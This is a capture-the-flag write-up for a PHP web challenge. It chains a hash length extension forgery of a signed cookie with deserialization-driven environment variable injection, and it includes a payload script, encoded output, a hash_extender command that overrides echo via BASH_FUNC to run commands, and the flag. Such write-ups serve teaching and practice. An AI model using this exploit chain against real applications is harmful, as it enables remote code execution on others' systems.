# Hello_GreyCat_alpha

### Challenge Details

a simple web which assign user a default name and store it into object, serialize it, sign it and store into cookie when they first visit the website. When the user visit the website again, the backend will verify the signature, deserialize the cookie and inject name into system variable called `name` and then call `system('echo $name')` to greet the player.

### Key Concepts

the signature is vulnerable to [hash length extension attack](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks):

```php
    function sign($str) {
        global $secret;
        return hash('sha256', $secret . $str);
    }
```

it allows you to forge a new stirng with extra bytes appended behind the original string, and derive the correct key. due to the Merkle-Damaged hash is being used. Attacker can construct another object string behind and achieve arbitrary environmental variable injection.

By abusing the environmental variable injection, player is able to achieve RCE by overwriting the echo with the BASH_FUNC extended variable. Refer to https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html (a very detailed Chinese blog post by [Phith0n](https://twitter.com/phithon_xg))  

### Solution

test.php:

```php
<?php

    class Greeting {
        private $info = array("name" => "GreyCat", "BASH_FUNC_echo()" => "() { id; }");

        public function __wakeup() {
            foreach ($this->info as $key => $value) {
                echo $key."->".$value."\n";
                putenv("{$key}={$value}");
            }
        }

        public function sayHi() {
            system('echo Hello, $name');
        }

    }

    $tmp = new Greeting;
    echo urlencode(serialize($tmp))."\n";

?>
```

```bash
$ php test.php
O%3A8%3A%22Greeting%22%3A1%3A%7Bs%3A14%3A%22%00Greeting%00info%22%3Ba%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A7%3A%22GreyCat%22%3Bs%3A16%3A%22BASH_FUNC_echo%28%29%22%3Bs%3A10%3A%22%28%29+%7B+id%3B+%7D%22%3B%7D%7D
```


```bash
$ ./hash_extender -data-format=html -d O%3A8%3A%22Greeting%22%3A1%3A%7Bs%3A14%3A%22%00Greeting%00info%22%3Ba%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A7%3A%22GreyCat%22%3B%7D%7D -s signature=ac404ceb2667d969d171a2f41dea1c110fd8020ad088237fe53ab293631f93ee -a %7cO%3A8%3A%22Greeting%22%3A1%3A%7Bs%3A14%3A%22%00Greeting%00info%22%3Ba%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A7%3A%22GreyCat%22%3Bs%3A16%3A%22BASH_FUNC_echo%28%29%22%3Bs%3A10%3A%22%28%29+%7B+id%3B+%7D%22%3B%7D%7D --append-format=html -f sha256 -l 25 --out-data-format=html
```


### Learning Objectives

see above

### Flag

```
grey{1_c4n7_b3l13v3_3nv_v4r14bl3_15_7h15_d4n63r0u5_f7b22fd61f6f7196}
```


